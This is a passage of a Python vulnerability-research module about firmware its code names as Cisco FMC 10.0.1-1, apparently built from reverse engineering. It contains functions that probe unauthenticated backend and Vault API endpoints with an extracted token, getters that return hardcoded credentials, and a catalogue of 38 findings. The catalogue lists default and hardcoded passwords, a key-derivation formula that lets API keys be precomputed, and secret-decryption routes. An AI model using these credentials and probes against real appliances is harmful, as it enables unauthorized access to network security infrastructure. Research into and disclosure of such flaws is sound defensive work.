    Probe muster-envoy HTTPS endpoint for unauthenticated access (F20).
    MUSTER_DISABLE_AUTH=True removes all auth from muster-ui-backend.
    muster-envoy listens at 127.0.0.1:6443 and proxies to the backend.
    Common paths: /, /api/v1/, /api/v1/connectors, /api/v1/identities
    """
    if session is None:
        session = requests.Session()
    session.verify = False

    results = {}
    base = f"https://{host}:{port}"
    paths = ["/", "/api/v1/", "/api/v1/connectors", "/api/v1/identities",
             "/api/v1/users", "/api/v1/groups", "/health"]

    for path in paths:
        url = f"{base}{path}"
        try:
            r = session.get(url, timeout=8)
            results[path] = {
                "status": r.status_code,
                "content_type": r.headers.get("content-type", ""),
                "body_snippet": r.text[:300],
            }
        except Exception as e:
            results[path] = {"error": str(e)}

    return {"finding": "FMC-F20", "host": host, "port": port, "results": results}


# ── F21: JaCORB constant ───────────────────────────────────────────────────────

JACORB_KEYSTORE_PASSWORD = "jacorb"
JACORB_DEFAULT_PASSWORD = "jacorb"

def get_jacorb_creds() -> dict:
    """Return JaCORB hardcoded passwords (F21)."""
    return {
        "finding": "FMC-F21",
        "keystore_password": JACORB_KEYSTORE_PASSWORD,
        "default_password": JACORB_DEFAULT_PASSWORD,
        "file": "opt/CSCOpx/lib/classpath/orb.properties",
        "impact": "Any CORBA SSL client that uses 'jacorb' as credential authenticates to CSCOpx services",
    }


# ── F22: Vault token extraction ────────────────────────────────────────────────

VAULT_TOKEN_PATH = "/etc/vault/token"
VAULT_BACKUP_DIR = "/etc/sf/vault/backup/"
VAULT_API_URL = "https://127.0.0.1:8200"

def probe_vault_token_access(rootfs_path: Optional[str] = None) -> dict:
    """
    Check for Vault token at static path (F22).
    In a live system, /etc/vault/token is the root token for Vault API access.
    From firmware extraction, token is not present but path is confirmed static.
    """
    result = {
        "finding": "FMC-F22",
        "token_path": VAULT_TOKEN_PATH,
        "backup_dir": VAULT_BACKUP_DIR,
        "vault_api": VAULT_API_URL,
        "token_found": False,
        "token_value": None,
    }

    if rootfs_path:
        token_file = Path(rootfs_path) / VAULT_TOKEN_PATH.lstrip("/")
        if token_file.exists():
            result["token_found"] = True
            result["token_value"] = token_file.read_text().strip()

        backup = Path(rootfs_path) / VAULT_BACKUP_DIR.lstrip("/")
        if backup.is_dir():
            result["backup_files"] = [f.name for f in backup.iterdir() if f.suffix == ".json"]

    return result


def probe_vault_api(host: str = "127.0.0.1", port: int = 8200,
                    token: Optional[str] = None,
                    session: Optional[requests.Session] = None) -> dict:
    """
    Probe Vault API with an extracted token (F22).
    GET /v1/secret/ lists all secret paths if token is valid.
    """
    if session is None:
        session = requests.Session()
    session.verify = False

    base = f"https://{host}:{port}"
    headers = {"X-Vault-Token": token} if token else {}

    results = {}
    paths = ["/v1/sys/health", "/v1/secret/", "/v1/secret/data/", "/v1/auth/token/lookup-self"]
    for path in paths:
        url = f"{base}{path}"
        try:
            r = session.get(url, headers=headers, timeout=8)
            results[path] = {"status": r.status_code, "body": r.text[:400]}
        except Exception as e:
            results[path] = {"error": str(e)}

    return {"finding": "FMC-F22", "host": host, "results": results}


# ── F23: IOS backend credentials ──────────────────────────────────────────────

IOS_BACKEND_CREDS = {"username": "admin", "password": "cisco"}
IOS_BACKEND_TEMPLATE = "opt/CSCOpx/MDC/ios-backend/templates/settings/ezsdd.xml"

def get_ios_backend_creds() -> dict:
    """Return IOS backend hardcoded device template credentials (F23)."""
    return {
        "finding": "FMC-F23",
        "creds": IOS_BACKEND_CREDS,
        "template_file": IOS_BACKEND_TEMPLATE,
        "impact": "admin:cisco used for IOS device onboarding; reused if template not regenerated post-install",
    }


# ── F24: dbaccess.conf default DB credentials ─────────────────────────────────

DBACCESS_DEFAULTS = {
    "mysql": {
        "root":       {"username": "root",       "password": "admin"},
        "interface":  {"username": "interface",  "password": "interface"},
        "barnyard":   {"username": "barnyard",   "password": "barnyard",  "schema": "sfsnort", "port": 3306},
        "correlator": {"username": "correlator", "password": "correlator"},
        "external":   {"username": "external",   "password": "external"},
        "cfguser":    {"username": "cfguser",    "password": "cfguser",   "schema": "cfgdb",   "port": 3306},
    },
    "monetdb": {
        "monetdb":  {"username": "monetdb",     "password": "monetdb123", "port": 5193},
        "eventdb":  {"username": "eventdb_user","password": "eventdb123", "port": 5193},
    },
}
DBACCESS_TEMPLATE = "/etc/sf/dbaccess.conf.in"
DBACCESS_CONF     = "/etc/sf/dbaccess.conf"
DBACCESS_DISABLE  = "/etc/sf/dbaccess.random.disable"

def get_dbaccess_defaults() -> dict:
    """Return default database credentials from dbaccess.conf.in template (F24)."""
    return {
        "finding": "FMC-F24",
        "template": DBACCESS_TEMPLATE,
        "runtime_conf": DBACCESS_CONF,
        "runtime_permissions": "0644 (world-readable, owner www:www)",
        "randomization_bypass": DBACCESS_DISABLE,
        "defaults": DBACCESS_DEFAULTS,
        "impact": (
            "MySQL root:admin = full database compromise; "
            "all accounts default to username==password or trivial values; "
            "dbaccess.conf is chmod 644 — any local process reads all DB creds; "
            "randomization is non-fatal: failure prints warning and continues with template defaults"
        ),
    }


# ── F25: Lamplighter JKS trustStorePassword in supervisord commandline ─────────

LAMPLIGHTER_JKS_PASSWORD = "lamplighter"
LAMPLIGHTER_JKS_PATH      = "opt/lamplighter/etc/certs/external_ca.jks"
LAMPLIGHTER_SUPERVISORD   = "opt/lamplighter/etc/supervisord-manager-active.conf"

def get_lamplighter_jks_password() -> dict:
    """Return lamplighter JKS trustStorePassword exposed in supervisord commandline (F25)."""
    return {
        "finding": "FMC-F25",
        "jks_file": LAMPLIGHTER_JKS_PATH,
        "password": LAMPLIGHTER_JKS_PASSWORD,
        "source": LAMPLIGHTER_SUPERVISORD,
        "exposure": "-Djavax.net.ssl.trustStorePassword=lamplighter in FeedDownloader commandline",
        "impact": "Password visible in /proc/<pid>/cmdline and supervisord config; unlocks external_ca.jks",
    }


# ── F26: MongoDB unauthenticated ───────────────────────────────────────────────

LAMPLIGHTER_MONGO_CONF = "opt/lamplighter/etc/mongod.conf"

def report_mongodb_noauth() -> dict:
    """Document MongoDB running without authentication (F26)."""
    return {
        "finding": "FMC-F26",
        "config": LAMPLIGHTER_MONGO_CONF,
        "bind": "127.0.0.1:27017",
        "auth_enabled": False,
        "database": "lamplighter",
        "content": "threat intelligence feeds (STIX/TAXII), threat intelligence correlation data",
        "impact": "any local process connects to MongoDB and reads/writes all threat intel data; no auth required",
    }


# ── F27: Redis unauthenticated ─────────────────────────────────────────────────

LAMPLIGHTER_REDIS_CONF = "opt/lamplighter/etc/redis.conf"

def report_redis_noauth() -> dict:
    """Document Redis running without authentication (F27)."""
    return {
        "finding": "FMC-F27",
        "config": LAMPLIGHTER_REDIS_CONF,
        "bind": "127.0.0.1:6379",
        "requirepass": None,
        "protected_mode": "commented out",
        "content": "threat intelligence feed cache",
        "impact": "any local process connects to Redis and reads/writes all cached threat intel data; no auth required",
    }


def full_findings_summary() -> list[dict]:
    """Return all confirmed FMC findings as structured records."""
    return [
        {
            "id": "FMC-F1",
            "severity": "HIGH",
            "component": "auth-daemon binary",
            "title": "auth-daemon Non-PIE EXEC — fixed load address, no ASLR",
            "cve": None,
            "version": "10.0.1-1",
            "binary": "/Volume/10.0.1-1/sf/bin/auth-daemon",
            "details": "ELF64 EXEC type; entry 0x47efa0; all ROP gadgets at fixed addresses",
        },
        {
            "id": "FMC-F2",
            "severity": "CRITICAL",
            "component": "MICE legacy interface / cwpass.xml",
            "title": "admin:admin and guest:(empty) hardcoded in cwpass.xml",
            "cve": None,
            "version": "10.0.1-1",
            "file": "/opt/CSCOpx/objects/security/conf/cwpass.xml",
            "details": "SHA-1(no salt): admin=SHA-1(admin), guest=SHA-1(empty). guest RoleType=All.",
        },
        {
            "id": "FMC-F3",
            "severity": "CRITICAL",
            "component": "MICE legacy interface",
            "title": "Guest account empty password + full access (RoleType=All)",
            "cve": None,
            "version": "10.0.1-1",
            "details": "guest:(empty) grants full MICE interface access. LocalhostServletFilter bypassable.",
        },
        {
            "id": "FMC-F4",
            "severity": "HIGH",
            "component": "Mojo REST auth handler",
            "title": "Audit log IP falsification via remote_address POST parameter",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/lib/perl/5.34.3/SF/Mojo/Handlers/Auth.pm",
            "details": "login() and logout() accept remote_address param, override REMOTE_ADDR env for audit writes",
        },
        {
            "id": "FMC-F5",
            "severity": "HIGH",
            "component": "Athena RBAC (NativeRbacServiceImpl)",
            "title": "BLANK_SEED = 72 spaces — predictable crypto seed",
            "cve": None,
            "version": "10.0.1-1",
            "jar": "athena-rbac-server.jar",
            "details": "static final String BLANK_SEED = 72 spaces; used as encryption seed",
        },
        {
            "id": "FMC-F6",
            "severity": "HIGH",
            "component": "MICE legacy interface / cwpass.xml",
            "title": "Unsalted SHA-1 password hashing in cwpass.xml",
            "cve": None,
            "version": "10.0.1-1",
            "details": "Raw SHA-1(password) with no salt — rainbow table trivially reverses all accounts",
        },
        {
            "id": "FMC-F7",
            "severity": "CRITICAL",
            "component": "RADKit REST API",
            "title": "RADKit sudoaccess endpoint grants FTD device root via radkit.modify permission",
            "cve": None,
            "version": "10.0.1-1",
            "endpoint": "PUT /api/fmc_troubleshoot/v1/domain/{domainUUID}/radkit/sudoaccess",
            "details": "isSudoEnabled=true enables root-level sudo on all RADKit-managed FTD devices",
        },
        {
            "id": "FMC-F8",
            "severity": "MEDIUM",
            "component": "Athena OGS filter (CsmCustomOgsFilter)",
            "title": "GroupId=2 hardcoded privileged group SQL assumption",
            "cve": None,
            "version": "10.0.1-1",
            "jar": "athena-rbac-server.jar",
            "details": "SQL: select DisplayAttribute from AthenaOgsGroupCacheTable where GroupId = 2",
        },
        {
            "id": "FMC-F9",
            "severity": "HIGH",
            "component": "SSO / ASA-ASDM-FMC trust",
            "title": "ASA/ASDM SSO token uses MD5 — forgeable under weak KEK entropy",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/lib/perl/5.34.3/SF/Auth.pm",
            "details": "create_sso_token: MD5(base64url(new_kek)); 1-min validity, single-use",
        },
        {
            "id": "FMC-F10",
            "severity": "HIGH",
            "component": "REST API auth-daemon JWT",
            "title": "HS256 symmetric JWT signing — key exposure = universal token forge",
            "cve": None,
            "version": "10.0.1-1",
            "details": "Tokens signed with HMAC-SHA256; key stored in Vault at https://127.0.0.1:8200",
        },
        {
            "id": "FMC-F11",
            "severity": "MEDIUM",
            "component": "FIPS 140-3 / cwpass.xml",
            "title": "SHA-1 used in cwpass.xml while FIPS 140-3 mode prohibits SHA-1",
            "cve": None,
            "version": "10.0.1-1",
            "details": "FIPS: crypto/sha1 not allowed; cwpass.xml uses SHA-1; behavior in FIPS mode TBD",
        },
        {
            "id": "FMC-F12",
            "severity": "MEDIUM",
            "component": "hestia-vpn-shared.jar / IKE PSK",
            "title": "IKE PSK written in plaintext via PreSharedKeyPolicyBase.toString()",
            "cve": None,
            "version": "10.0.1-1",
            "jar": "hestia-vpn-shared.jar",
            "details": "toString() appends 'Key: ' + sharedKey unmasked; VPN topology debug log leaks all PSKs",
        },
        {
            "id": "FMC-F13",
            "severity": "MEDIUM",
            "component": "RADKit REST API (undocumented)",
            "title": "Undocumented RADKit authorizations endpoint — alternate device-access enumeration",
            "cve": None,
            "version": "10.0.1-1",
            "endpoint": "GET/PUT /api/fmc_troubleshoot/v1/domain/{domainUUID}/radkit/authorizations",
            "details": "Undocumented endpoint in same RBAC domain as sudoaccess; not in public API docs",
        },
        {
            "id": "FMC-F14",
            "severity": "MEDIUM",
            "component": "cs-psucli.jar / PSU SecurityHandler",
            "title": "Hardcoded passw0rd AES key encrypts stored CCO credentials",
            "cve": None,
            "version": "10.0.1-1",
            "jar": "cs-psucli.jar",
            "details": "SecurityHandler.passwordString='passw0rd'; ObjectInputStream before decrypt = deserialization risk",
        },
        {
            "id": "FMC-F15",
            "severity": "CRITICAL",
            "component": "PJB handler / on-box mode",
            "title": "PJB handler skips auth+RBAC when isNGFWOnbox() — unauthenticated function dispatch",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/lib/perl/5.34.3/SF/Mojo/Handlers/PjbHandler.pm + SF/UI/PJB.pm",
            "details": "isNGFWOnbox(): session auth skipped + all FUNCTION_PERMISSIONS bypassed; any function callable",
            "trigger": "hardware FMC (Aquila-class) with /etc/sf/onbox.run present",
        },
        {
            "id": "FMC-F16",
            "severity": "HIGH",
            "component": "ASDM login / SSO",
            "title": "AsdmLoginHandler hardcodes admin — forged SSO token = admin session",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/lib/perl/5.34.3/SF/Mojo/Handlers/AsdmLoginHandler.pm",
            "details": "Login({ username=>'admin', password=>$token }); MD5 token (F9) -> admin FMC session",
        },
        {
            "id": "FMC-F17",
            "severity": "CRITICAL",
            "component": "SymmetricDS / database replication",
            "title": "SymmetricDS hardcoded Sybase and MySQL credentials",
            "cve": None,
            "version": "10.0.1-1",
            "files": ["syb-000.properties", "mdb-001.properties"],
            "details": (
                "Sybase: dba:dmkebdpq (port 10033); "
                "MySQL: root:IlahU)[hO8Ug}jdX:)5zoZx[297l*{Qv@4]wVk]/ (port 3306); "
                "prior passwords commented out in both files"
            ),
        },
        {
            "id": "FMC-F18",
            "severity": "CRITICAL",
            "component": "CSDAC / muster-envoy TLS",
            "title": "Firmware-embedded RSA-2048 private key shared across all FMC 10.0.1-1 installs",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/csdac/config/certs/key.pem",
            "details": (
                "RSA-2048 PKCS#8 key mounted into muster-envoy as /etc/envoy/certificate.key; "
                "identical across all FMC 10.0.1-1 installs; "
                "enables TLS impersonation of any FMC's CSDAC endpoint"
            ),
        },
        {
            "id": "FMC-F19",
            "severity": "HIGH",
            "component": "CSCOpx / ActiveMQ",
            "title": "ActiveMQ hardcoded credentials and default JKS keystore password",
            "cve": None,
            "version": "10.0.1-1",
            "files": [
                "opt/CSCOpx/objects/ess/conf/credentials.properties",
                "opt/CSCOpx/objects/ess/bin/linux-x86-64/wrapper.conf",
            ],
            "details": (
                "system:manager, guest:password in credentials.properties; "
                "keyStorePassword=password, trustStorePassword=password in wrapper.conf; "
                "OpenWire port 61616"
            ),
        },
        {
            "id": "FMC-F20",
            "severity": "CRITICAL",
            "component": "CSDAC / muster-ui-backend",
            "title": "MUSTER_DISABLE_AUTH=True with Docker socket mount in CSDAC backend",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/csdac/docker-compose.yml",
            "details": (
                "muster-ui-backend: MUSTER_DISABLE_AUTH=True env var disables all auth; "
                "/var/run/docker.sock mounted read-write; "
                "DISABLE_AUTH=True removes application-layer auth; Docker socket mounted read-write"
            ),
        },
        {
            "id": "FMC-F21",
            "severity": "HIGH",
            "component": "CSCOpx / JaCORB CORBA",
            "title": "JaCORB hardcoded keystore and default passwords",
            "cve": None,
            "version": "10.0.1-1",
            "file": "opt/CSCOpx/lib/classpath/orb.properties",
            "details": (
                "jacorb.security.keystore_password=jacorb; "
                "jacorb.security.default_password=jacorb; "
                "any client knowing 'jacorb' establishes authenticated CORBA SSL sessions"
            ),
        },
        {
            "id": "FMC-F22",
            "severity": "HIGH",
            "component": "HashiCorp Vault / backup",
            "title": "Vault token at static filesystem path — any local read = Vault compromise",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/bin/backup_restore_vault_secrets.pl",
            "details": (
                "VAULT_TOKEN='/etc/vault/token'; "
                "vault login $token grants full Vault access; "
                "secrets backed up to /etc/sf/vault/backup/*.json; "
                "Token at static path authenticates to Vault; backup JSON files are offline exfiltration path"
            ),
        },
        {
            "id": "FMC-F23",
            "severity": "HIGH",
            "component": "CSCOpx IOS backend",
            "title": "IOS backend hardcoded admin:cisco in device template",
            "cve": None,
            "version": "10.0.1-1",
            "file": "opt/CSCOpx/MDC/ios-backend/templates/settings/ezsdd.xml",
            "details": (
                "username=admin&passwd=cisco in XML device template; "
                "used for IOS device onboarding from FMC; "
                "credentials reused if template not regenerated"
            ),
        },
        {
            "id": "FMC-F24",
            "severity": "CRITICAL",
            "component": "DBUtils / dbaccess.conf",
            "title": "Default database credentials in dbaccess.conf.in — world-readable runtime config",
            "cve": None,
            "version": "10.0.1-1",
            "files": [
                "etc/sf/dbaccess.conf.in",
                "etc/sf/dbaccess.conf",
            ],
            "details": (
                "MySQL root:admin, interface:interface, barnyard:barnyard, correlator:correlator, "
                "external:external, cfguser:cfguser; "
                "MonetDB monetdb:monetdb123, eventdb_user:eventdb123; "
                "runtime dbaccess.conf is chmod 644 (world-readable); "
                "randomization non-fatal: failure continues with template defaults; "
                "bypass: /etc/sf/dbaccess.random.disable"
            ),
        },
        {
            "id": "FMC-F25",
            "severity": "HIGH",
            "component": "Lamplighter / FeedDownloader JKS",
            "title": "trustStorePassword=lamplighter hardcoded in supervisord commandline",
            "cve": None,
            "version": "10.0.1-1",
            "file": "opt/lamplighter/etc/supervisord-manager-active.conf",
            "details": (
                "-Djavax.net.ssl.trustStorePassword=lamplighter in FeedDownloader Java commandline; "
                "visible in /proc/<pid>/cmdline; "
                "unlocks opt/lamplighter/etc/certs/external_ca.jks"
            ),
        },
        {
            "id": "FMC-F26",
            "severity": "MEDIUM",
            "component": "Lamplighter / MongoDB",
            "title": "MongoDB runs without authentication — threat intelligence database",
            "cve": None,
            "version": "10.0.1-1",
            "file": "opt/lamplighter/etc/mongod.conf",
            "details": (
                "security.authorization not configured; "
                "bind 127.0.0.1:27017; "
                "database lamplighter stores all STIX/TAXII threat intel data; "
                "any local process connects and reads/writes without credentials"
            ),
        },
        {
            "id": "FMC-F27",
            "severity": "MEDIUM",
            "component": "Lamplighter / Redis",
            "title": "Redis runs without authentication — threat intelligence cache",
            "cve": None,
            "version": "10.0.1-1",
            "file": "opt/lamplighter/etc/redis.conf",
            "details": (
                "requirepass not set; protected-mode commented out; "
                "bind 127.0.0.1:6379; "
                "caches threat intelligence feed data; "
                "any local process connects without credentials"
            ),
        },
        {
            "id": "FMC-F28",
            "severity": "CRITICAL",
            "component": "RabbitMQ / Message Broker",
            "title": "definitions.json — six hardcoded default passwords including administrator",
            "cve": None,
            "version": "10.0.1-1",
            "file": "etc/rabbitmq/definitions.json",
            "details": (
                "Six users with hardcoded passwords loaded at broker startup via load_definitions; "
                "bonfire-manager:password (tags:administrator), bonfire-app:password (application), "
                "correlator-app:(empty) (application), FMC:(empty), LL:(empty), ll-local-user:ll-local-user; "
                "bonfire-manager has full vhost admin rights; "
                "rabbitmq.config: {loopback_users, []} — management UI reachable from any interface; "
                "any host-level process can enumerate queues, inject messages, and delete exchanges"
            ),
        },
        {
            "id": "FMC-F29",
            "severity": "CRITICAL",
            "component": "MICE / Apache HTTPd",
            "title": "MICE legacy port 1741 — plain HTTP, SSLEngine Off, all interfaces",
            "cve": None,
            "version": "10.0.1-1",
            "file": "etc/httpd/conf.d/ajp-connector.conf",
            "details": (
                "Listen 0.0.0.0:1741 and Listen :::1741 — bound to all interfaces; "
                "VirtualHost _default_:1741 sets SSLEngine Off; "
                "JkMount /CSCOnm/servlet/* /desktop/DesktopServlet/* /athena/* ajp13 — "
                "routes Athena/CSM servlet traffic over plain HTTP; "
                "SSLVerifyClient none on all Location blocks; "
                "traffic traversing this vhost is cleartext on the wire"
            ),
        },
        {
            "id": "FMC-F30",
            "severity": "HIGH",
            "component": "Tomcat / AJP Connector",
            "title": "AJP connector secretRequired=false — Ghostcat mitigation disabled",
            "cve": "CVE-2020-1938",
            "version": "10.0.1-1",
            "file": "opt/CSCOpx/MDC/tomcat/conf/server.xml",
            "details": (
                'Connector port="9009" protocol="AJP/1.3" address="localhost" secretRequired="false"; '
                "no shared secret configured on the AJP/1.3 channel; "
                "equivalent configuration class to CVE-2020-1938 (Ghostcat); "
                "attacker with access to localhost:9009 can read arbitrary webapp files "
                "and achieve unauthenticated RCE if file upload is available anywhere in the application"
            ),
        },
        {
            "id": "FMC-F31",
            "severity": "HIGH",
            "component": "Threat Grid / API Key Derivation",
            "title": "Threat Grid API key derived from network-observable MAC address",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/lib/perl/5.34.3/SF/Files/Analysis.pm",
            "details": (
                'Analysis.pm:1869: $apikey = sprintf("%012s%02X%02X", uc($mac), $model_number, ord($model_id)); '
                "key is a deterministic function of the management interface MAC (network-observable), "
                "model number (disclosed in SNMP/UI), and single-byte model ID; "
                "total entropy: MAC (47 bits observed) + model (~8 bits) + model_id (~8 bits); "
                "attacker who observes management MAC can pre-compute the API key without authentication"
            ),
        },
        {
            "id": "FMC-F32",
            "severity": "HIGH",
            "component": "Auth / Machine Service Accounts",
            "title": "five hardcoded machine service accounts with fixed passwords",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/lib/perl/5.34.3/SF/",
            "details": (
                "Hardcoded credential pairs used by internal machine sessions: "
                "report:snortrules (SF/ReportGen.pm:4605 + 5828, SF::Auth::LoginSystem); "
                "csm_processes:csmdaemon (SF/CSMAgent.pm:1185, SF::MachineAuth::Login); "
                "admin:Sourcefire (SF/InitSequence.pm:305, firstboot/init auth path); "
                "admin:Admin123 (SF/PeerManager/FTDCloudProxy.pm:44, FTD provisioning); "
                "admin:space (SF/CLI/system.pm:1171, CLI auth); "
                "all five bypass password-strength enforcement because AUTH_IS_MACHINE path "
                "skips the strength validator; any of these credentials grants a valid session "
                "if the underlying DB account exists"
            ),
        },
        {
            "id": "FMC-F33",
            "severity": "HIGH",
            "component": "Auth / Multi-subsystem Default",
            "title": "Admin123 hardcoded as provisioning default across multiple subsystems",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/lib/perl/5.34.3/SF/PeerManager/FTDCloudProxy.pm",
            "details": (
                "FTDCloudProxy.pm:44: my $defaultPassword = 'Admin123'; — used for FTD device provisioning (line 94); "
                "init_lights_out_mgmt.pl:8: my $ADMIN_PASS = 'Admin123'; — IPMI BMC provisioning; "
                "SF::Auth.pm:4018: if($pw && ($pw eq 'Admin123')) — explicit check that acknowledges Admin123 "
                "as a known default requiring rejection, yet the provisioning paths still set it; "
                "SF::Permission.pm:131: comment notes Admin123 check was intentionally omitted from validation path; "
                "Admin123 is the provisioning default for FTD device registration and hardware IPMI; "
                "window between provisioning and first forced-change is the attack surface"
            ),
        },
        {
            "id": "FMC-F34",
            "severity": "HIGH",
            "component": "RADIUS / AuthConfig",
            "title": "RADIUS shared secret encrypted with non-secret APPLIANCE_UUID",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/lib/perl/5.34.3/SF/UMPD/Plugins/PlatformSettings/AuthConfig.pm",
            "details": (
                "AuthConfig.pm:1436: my $appliance_uuid = SF::Util::getApplianceUUID(); "
                "AuthConfig.pm:1439: my $encrypted = `echo $string | openssl enc -aes-128-cbc -base64 "
                "-pbkdf2 -pass pass:$appliance_uuid -A`; "
                "APPLIANCE_UUID is a system identifier (available via UI, SNMP, and /etc/sf/ims.conf); "
                "using a non-secret identifier as the AES passphrase means anyone who obtains the UUID "
                "and the ciphertext (world-readable DB row) can recover the RADIUS shared secret; "
                "second decrypt path at line 1452 uses the same pattern"
            ),
        },
        {
            "id": "FMC-F35",
            "severity": "HIGH",
            "component": "IPMI / BMC Provisioning",
            "title": "IPMI BMC provisioned with hardcoded admin:Admin123",
            "cve": None,
            "version": "10.0.1-1",
            "file": "etc/rc.d/init.d/init_lights_out_mgmt.pl",
            "details": (
                "init_lights_out_mgmt.pl:7-8: my $ADMIN_USER = 'admin'; my $ADMIN_PASS = 'Admin123'; "
                "SF::IPMI::user_add($BMC_CHANNEL, { username => $ADMIN_USER, password => $ADMIN_PASS }); "
                "applies to pre-M8 FMC hardware appliances; "
                "IPMI channel is configured before any post-boot password rotation; "
                "admin:Admin123 grants IPMI LAN access (ipmitool, SOL, KVM-over-LAN) "
                "to any host reachable on the management network; "
                "IPMI credential is independent of the OS login; changing the OS admin password does not affect it"
            ),
        },
        {
            "id": "FMC-F36",
            "severity": "MEDIUM",
            "component": "SMTP / Email Settings",
            "title": "SMTP credentials encrypted with hardcoded Blowfish key 'sourcefire'",
            "cve": None,
            "version": "10.0.1-1",
            "file": "sf/lib/perl/5.34.3/SF/ConfigEmailSettings.pm",
            "details": (
                "ConfigEmailSettings.pm:259: return Crypt::CBC->new(-key => 'sourcefire', -cipher => 'Blowfish'); "
                "same static key encrypts both live (emailCredentials) and test (emailCredentialsTest) SMTP credentials; "
                "encrypted blobs stored in Vault under userCredentials/emailCredentials path; "
                "any process that can read the Vault path and knows the static key can decrypt SMTP credentials; "
                "Blowfish-CBC with a static passphrase provides no effective confidentiality"
            ),
        },
        {
            "id": "FMC-F37",
            "severity": "MEDIUM",
            "component": "RabbitMQ / TLS Configuration",
            "title": "RabbitMQ restricted to deprecated TLSv1.1",
            "cve": None,
            "version": "10.0.1-1",
            "file": "etc/rabbitmq/rabbitmq.config",
            "details": (
                "rabbitmq.config:14: {versions, ['tlsv1.1']} — ssl_options restrict broker TLS to TLSv1.1 only; "
                "TLSv1.1 deprecated by RFC 8996 (March 2021) and disabled by default in OpenSSL 3.x; "
                "connection is susceptible to known TLSv1.1 downgrade and padding oracle attacks; "
                "all inter-process and cross-host RabbitMQ traffic is limited to deprecated TLS"
            ),
        },
        {
            "id": "FMC-F38",
            "severity": "MEDIUM",
            "component": "PAM / Account Lockout",
            "title": "pam_faillock deny=0 — OS-level account lockout disabled",
            "cve": None,
            "version": "10.0.1-1",
            "file": "etc/pam.d/system-auth",
            "details": (
                "system-auth:8: auth required pam_faillock.so preauth per_user deny=0 unlock_time=1800; "
                "system-auth:10: auth required pam_faillock.so authfail per_user deny=0 unlock_time=1800; "
                "deny=0 disables the lockout counter — no failed-attempt threshold is enforced at the OS PAM layer; "
                "SSH and console brute-force attacks against any OS account are not rate-limited by PAM; "
                "pam_faillock module is loaded but provides no protection in this configuration"
            ),
        },
    ]


if __name__ == "__main__":
    import json as _json

    print(f"[cisco_fmc_re] {TARGET} v{VERSION}")
    print()

    print("=== F1: auth-daemon PIE status ===")
    ws = "/media/cowboy/research/cisco-re/fmc-10.0.1"
    result = report_binary_pie_status(f"{ws}/binaries/auth-daemon")
    print(_json.dumps(result, indent=2))

    print()
    print("=== F2/F6: cwpass.xml hash verification ===")
    for entry in verify_cwpass_hashes():
        print(_json.dumps(entry, indent=2))

    print()
    print("=== All confirmed findings ===")
    for f in full_findings_summary():
        print(f"  [{f['severity']:8}] {f['id']}: {f['title']}")
